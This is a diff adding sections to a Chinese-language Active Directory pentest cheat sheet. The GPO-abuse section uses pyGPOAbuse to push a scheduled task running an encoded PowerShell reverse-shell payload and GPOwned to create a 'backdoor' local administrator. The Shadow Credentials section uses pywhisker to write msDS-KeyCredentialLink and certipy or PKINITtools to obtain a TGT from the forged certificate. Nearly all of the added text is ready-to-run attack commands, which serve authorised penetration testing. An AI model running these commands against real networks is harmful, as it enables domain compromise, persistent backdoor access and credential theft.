@@ -159,3 +159,41 @@ impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-xxx \
 | 机器账户 | 域用户即可 | 高（RBCD 后门） |
 | Shadow Credentials | 写 msDS-KeyCredentialLink | 高（证书认证） |
 | Golden Certificate | CA 私钥 | 极高（伪造任意证书） |
+
+## GPO 滥用 — gpowned
+
+当拥有对 GPO 的写权限时，可通过 GPO 部署恶意计划任务/脚本：
+
+```bash
+# 检查当前用户对哪些 GPO 有写权限
+bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP get writable --otype gpo
+
+# 通过 GPO 添加计划任务（反弹 shell）
+python3 /pentest/pyGPOAbuse/pygpoabuse.py DOMAIN/USER:PASS \
+  -gpo-id "GPO_GUID" -command "powershell -e BASE64_PAYLOAD" \
+  -dc-ip DC_IP -f
+
+# GPOwned — GPO 滥用另一个工具
+python3 /pentest/GPOwned/GPOwned.py -u USER -p PASS -d DOMAIN -dc-ip DC_IP \
+  -gpo-id "GPO_GUID" -command "net user backdoor P@ss /add && net localgroup administrators backdoor /add"
+```
+
+## Shadow Credentials — pywhisker
+
+当拥有对目标用户/机器的 `msDS-KeyCredentialLink` 属性写权限时：
+
+```bash
+# 添加 Shadow Credentials（生成证书 + 修改 KeyCredentialLink）
+python3 /pentest/pywhisker/pywhisker.py -d DOMAIN -u ATTACKER -p PASS \
+  --target TARGET_USER --action add --dc-ip DC_IP
+
+# 用生成的证书获取 TGT（配合 certipy 或 PKINITtools）
+certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP
+# 或
+python3 /pentest/PKINITtools/gettgtpkinit.py -cert-pfx TARGET_USER.pfx \
+  DOMAIN/TARGET_USER TARGET_USER.ccache
+
+# 清理 Shadow Credentials
+python3 /pentest/pywhisker/pywhisker.py -d DOMAIN -u ATTACKER -p PASS \
+  --target TARGET_USER --action remove --device-id DEVICE_ID --dc-ip DC_IP
+```
